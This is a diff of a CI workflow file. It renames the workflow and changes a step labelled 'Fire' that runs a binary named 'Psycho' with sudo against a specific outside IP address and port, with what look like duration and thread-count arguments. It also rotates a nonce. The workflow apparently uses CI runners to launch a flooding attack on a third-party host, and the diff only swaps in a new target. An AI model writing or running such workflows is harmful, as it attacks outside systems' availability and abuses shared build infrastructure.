@@ -1,4 +1,4 @@
-name: psycho-b3a2f192
+name: psycho-04b423c5
 on:
   push:
     branches: [ main, master ]
@@ -18,6 +18,6 @@ jobs:
     - name: Make executable
       run: chmod +x Psycho
     - name: Fire
-      run: timeout 120s sudo ./Psycho 91.108.17.23 32001 120 1200
-    - name: Nonce b3a2f192
-      run: echo "nonce=b3a2f192"
+      run: timeout 120s sudo ./Psycho 91.108.17.10 32000 120 1200
+    - name: Nonce 04b423c5
+      run: echo "nonce=04b423c5"
